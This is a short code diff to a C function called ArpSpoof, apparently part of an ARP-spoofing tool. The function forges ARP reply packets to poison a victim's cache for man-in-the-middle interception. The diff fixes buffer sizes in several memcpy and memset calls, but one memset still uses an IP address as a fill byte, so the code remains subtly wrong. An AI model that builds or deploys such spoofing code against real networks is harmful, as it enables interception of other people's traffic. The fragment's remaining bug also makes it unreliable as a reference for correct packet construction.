@@ -57,10 +57,10 @@ void ArpSpoof(const char* if_name,const char* sender_ip_string,const char* targe
     req.arp_op=htons(ARPOP_REPLY);
     memcpy(&req.arp_sha,my_mac_addr,sizeof(req.arp_sha));
     //memset(&req.arp_spa,inet_addr(target_ip_string),0x4);//
-    memcpy(&req.arp_spa,packet+0x1c,0x04);
-    memcpy(&req.arp_tha,packet+0x16,sizeof(req.arp_tha));
+    memcpy(&req.arp_spa,&packet[0x1c],sizeof(req.arp_spa));
+    memcpy(&req.arp_tha,&packet[0x16],sizeof(req.arp_tha));
     //*req.arp_tpa=inet_addr(sender_ip_string);
-    memset(&req.arp_tpa,inet_addr(sender_ip_string),0x32);//
+    memset(&req.arp_tpa,inet_addr(sender_ip_string),sizeof(req.arp_tpa));//
 
     // Combine the Ethernet header and ARP request into a contiguous block.
     unsigned char frame[sizeof(struct ether_header)+sizeof(struct ether_arp)];
